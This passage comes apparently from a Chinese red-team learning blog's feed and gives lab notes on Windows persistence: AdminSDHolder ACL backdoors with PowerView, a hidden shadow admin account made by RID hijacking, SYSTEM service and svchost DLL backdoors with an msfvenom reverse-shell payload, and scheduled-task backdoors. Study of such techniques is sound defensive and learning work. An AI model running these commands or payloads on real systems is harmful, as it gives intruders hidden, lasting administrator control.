“&amp;(objectcategory&#x3D;group)(admincount&#x3D;1)” -dn<br>在默认情况下，系统将定期（每60分钟)检查受保护对象的安全描述符，将受保护对象的 ACL 与 AdminSDHolder 容器的 ACL 进行比较，如果二者不一致，系统就会将受保护对象的 ACL 强制修改为 AdminSDHolder 容器的 ACL。该工作通过 SDProp 进程来完成，该进程以 60 分钟为一个工作周期</p><p>在实战中，hacker 可以篡改 AdminSDHolder 容器的 ACL 配置。当系统调用 SDProp 进程执行相关工作时，被篡改的 ACL 配置将同步到受保护的 ACL 中，以此建立一个隐蔽的域后门。</p><p>利用条件：域管</p><p>执行以下命令，通过 PowerView 向 AdminSDHolder 容器对象添加一个 ACL，使普通域用户 Alice 拥有对 AdminSDHolder 的 “完全控制” 权限。<br>Import-Module .\PowerView.ps1<br>Add-DomainObjectAcl -TargetSearchBase “LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;hack-my,DC&#x3D;com” -PrincipalIdentity Alice -Rights All -Verbose<br>执行后，Alice 用户成功拥有 AdminSDHolder 容器对象的完全控制权限<br>等待 60 分钟后，Alice 用户将获得对系统中的特权用户和组完全控制权限。</p><p>清除:<br>Remove-DomainObjectAcl -TargetSearchBase “LDAP:&#x2F;&#x2F;CN&#x3D;AdminSDHolder,CN&#x3D;System,DC&#x3D;hack-my,DC&#x3D;com” -PrincipalIdentity Alice -Rights All -Verbose</p><h3 id="缩短SDDrop工作周期："><a href="#缩短SDDrop工作周期：" class="headerlink" title="缩短SDDrop工作周期："></a>缩短SDDrop工作周期：</h3><p>方法1：修改注册表<br>hacker 也可以通过注册表手动修改 SDProp 进程的工作周期，以缩短等待的时长（最小值1分钟，最大值2小时）。该注册表需要慎重修改， 当修改的频率变高时，CPU处理LSASS的开销也就越大，这很容易导致系统变得卡顿，该注册表键默认是不存在的。<br># 工作周期修改为 1 分钟，键值以秒为单位<br>reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters\AdminSDProtectFrequency &#x2F;t REG_DWORD &#x2F;d 60<br><img src="/../persistence2/CC78F93324944541A4E94A15482D5AC6.jpg" alt="img"><br>方法2：强制 SDProp 执行<br>① 运行 Ldp.exe（C:\Windows\System32\Ldp.exe）<br>② 点击连接 -&gt; 连接，输入当前机器的机器名或IP，端口默认为 389<br>③ 点击连接 -&gt; 绑定，选择绑定为当前登录的用户<br>④ 在修改窗口这里针对不同版本的域控制器有不同的情况：<br>当域控为Windows Server 2008时，点击浏览 -&gt; 修改，在属性选项卡中输入 FixUpInheritance ，在值字段输入 yes。操作选择添加，然后点击输入，最后运行即可。<br><img src="/../persistence2/F22A44B9CA074887A523976F6DD3E7D9.jpg" alt="img"><br>当域控为Windows Server 2008 R2或Windows Server 2012及以上时，点击浏览 -&gt; 修改，在属性选项卡中输入 RunProtectAdminGroupsTask ，在值字段输入 1。操作选择添加，然后点击输入，最后运行即可。<br><img src="/../persistence2/FE2FF8B6BF834521A4E8D90AA2516010.jpg" alt="img"></p><h1 id="5：通过HOOK-PasswordChangeNotify"><a href="#5：通过HOOK-PasswordChangeNotify" class="headerlink" title="5：通过HOOK PasswordChangeNotify"></a>5：通过HOOK PasswordChangeNotify</h1><p>PasswordChangeNotify 在微软官方文档中的名称为 PsamPasswordNotificationRoutine，是一个 Windows API。当用户重置密码时，Windows 会先检查新密码是否符合复杂性要求，如果密码符合要求，LSA 会调用 PasswordChangeNotify 函数在系统中同步密码。<br>当调用 PasswordChangeNotify 时，用户名和密码将以明文的形式传入。hacker 可以通过 Hook 技术，劫持 PasswordChangeNotify 函数的执行流程，从而获取传入的明文密码。</p><p>没复现。</p>]]></content>
    
    
    
    <tags>
      
      <tag>Red Team</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>权限维持-系统后门</title>
    <link href="/2024/01/19/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8/"/>
    <url>/2024/01/19/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E7%B3%BB%E7%BB%9F%E5%90%8E%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<p>权限维持，作为红队行动中的重要组成部分，在此篇笔记进行学习。<br>实验环境为windows server 2012 ，未安装任何软硬件。vmware workstation 17</p><h1 id="1：创建影子账户"><a href="#1：创建影子账户" class="headerlink" title="1：创建影子账户"></a>1：创建影子账户</h1><p>隐藏的账户，无论通过计算机管理，还是命令行查询，都无法看到，只能在注册表看到其信息。</p><p>条件：拥有管理员权限</p><p>利用：<br>net user shadow$ Hacker@123 &#x2F;add<br>此时初步拥有了一个隐藏账户，接下来我们要让他还有管理员权限，和采取更加隐蔽的措施</p><p>打开注册表：<br>HKEY_LOCAL_MACHINE\SAM\SAM<br>右键，修改权限：<br><img src="/../persistence1/603CCB4B991D479EB656FE1F19454FB8.png" alt="img"><br>重启下regedit。</p><p>找到Administrator：<br><img src="/../persistence1/1AA3FC8298414FEEA4BB951848156722.png" alt="img"><br>找到其对应的000001F4(在Names里点Administrator即可查看)<br>复制F里的内容。</p><p>找到shadow$对应的内容，把复制的内容粘贴到其F内<br>相当于劫持了Administrator的RID。</p><ul><li>什么是RID？<br>RID是SID的一部分，用于标识同一个安全主体的不同实例，你可以看做是类与实例化对象的区别</li></ul><p>此时权限提升完毕，但是我们还是可以在管理用户界面看到shadow$用户。</p><p>将shadow$和00003EA导出。<br>删除：<br>net user shadow$ &#x2F;del</p><p>然后打开注册表，再导入。</p><p>此时shadow$用户拥有管理员权限，并且只能在注册表看到它。</p><p>测试：使用runas命令运行shadow的cmd<br><img src="/../persistence1/D5897BD0C8734297A651087F22491DE5.png" alt="img"><br>如图，完全成功。</p><h1 id="2：系统服务后门"><a href="#2：系统服务后门" class="headerlink" title="2：系统服务后门"></a>2：系统服务后门</h1><p>众所周知windows后台一堆服务，其中包含勾八的自动更新服务一声不响给你电脑重启了。<br>同样的，服务也可以作为后门程序。</p><p>利用条件：<br>管理员权限</p><p>原理：<br>其实和服务路径劫持差不多，把服务路径信息换成自己的payload，服务重启后会再次获得权限。</p><h3 id="1：自己创建服务："><a href="#1：自己创建服务：" class="headerlink" title="1：自己创建服务："></a>1：自己创建服务：</h3><p>sc create Hacker101 binPath&#x3D; “cmd.exe &#x2F;k C:\Users\Administrator\Desktop\shell.exe” start&#x3D; “auto” obj&#x3D; “LocalSystem”</p><p>#等号后面必须有空格。<br>#start指定启动类型，obj指定运行权限，为SYSTEM。</p><p>当系统或服务重启，将以SYSTEM权限运行反弹shell.exe</p><h3 id="2：利用现有的系统服务。"><a href="#2：利用现有的系统服务。" class="headerlink" title="2：利用现有的系统服务。"></a>2：利用现有的系统服务。</h3><p>见系统服务提权部分。</p><h3 id="3：svchost-exe"><a href="#3：svchost-exe" class="headerlink" title="3：svchost.exe"></a>3：svchost.exe</h3><p>很熟悉的名字。svchost是Windows的系统文件。<br>许多dll的启动，需要将其注入进svchost.exe才可以启动，故进程中存在多个svchost.exe也是正常的。</p><p><img src="/../persistence1/03FB7E1B75AC44F78624D3C05B1649CF.png" alt="img"><br>我们以wuauserv为例子。<br>其ImagePath为svchost.exe</p><p>然后看Parameters：<br><img src="/../persistence1/CC3DEB28B8CF4791AE38728E91A12B6A.png" alt="img"><br>是个dll。</p><p>-k netsvcs 这个是表示该服务属于netsvcs这个服务组。通常，每个svchost负责运行一组服务。<br>所以并不是每启动一个服务就要添加一个svchost进程。</p><p>如果要查看svchost的所有，在：<br>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</p><ul><li>实战中，由于是将恶意服务的dll加载到svchost进程，这个恶意进程还不是独立运行的，故拥有很高的隐蔽性。</li></ul><p>msfvenom生成反弹shell：<br>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp lhost&#x3D;192.168.220.132 lport&#x3D;6666 -f dll &gt; reverse_tcp.dll</p><ul><li>不要用Powershell：<br>sc create Backdoor binpath&#x3D; “C:\Windows\system32\svchost.exe -k netsvc” start&#x3D; “auto” obj&#x3D; “LocalSystem”</li></ul><p>设置加载dll：<br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor\Parameters &#x2F;v ServiceDll &#x2F;t REG_EXPAND_SZ &#x2F;d “C:\Windows\System32\reverse_tcp.dll”</p><p>设置服务描述：<br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor &#x2F;v Description &#x2F;t REG_SZ &#x2F;d “Windows Service”</p><p>设置显示名称：<br>reg add HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\Backdoor &#x2F;v DisplayName &#x2F;t REG_SZ &#x2F;d “Backdoor”</p><p>创建新分组netsvc，并将backdoor加进去<br>reg add “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost” &#x2F;v netsvc &#x2F;t REG_MULTI_SZ &#x2F;d Backdoor</p><p>系统重启时，Svchost以SYSTEM权限加载恶意服务，目标主机上线。</p><ul><li>没成功</li></ul><h1 id="3：计划任务后门"><a href="#3：计划任务后门" class="headerlink" title="3：计划任务后门"></a>3：计划任务后门</h1><p>典中典了属于是。</p><p>schtasks &#x2F;Create &#x2F;TN Backdoor &#x2F;SC minute &#x2F;MO 1 &#x2F;TR C:\Windows\System32\shell.exe &#x2F;RU System &#x2F;F</p><p>执行以下命令，在目标主机上创建一个名为 Backdoor 的计划任务，每 60 秒以 SYSTEM 权限运行一次后门程序 shell.exe。</p><p># &#x2F;TN，指定要创建的计划任务的名称</p><p># &#x2F;SC，指定计划任务执行频率</p><p># &#x2F;MO，指定计划任务执行周期</p><p># &#x2F;TR，指定计划任务运行的程序路径</p><p># &#x2F;RU，指定计划任务运行的用户权限</p><p># &#x2F;F，如果指定的任务已经存在，则强制创建</p><p><img src="/../persistence1/Image(75).png" alt="img"></p><p>如图，成功上线。</p><p>查看计划任务：</p><p><img src="/../persistence1/Image(76).png" alt="img"><img src="data:image/png;base64,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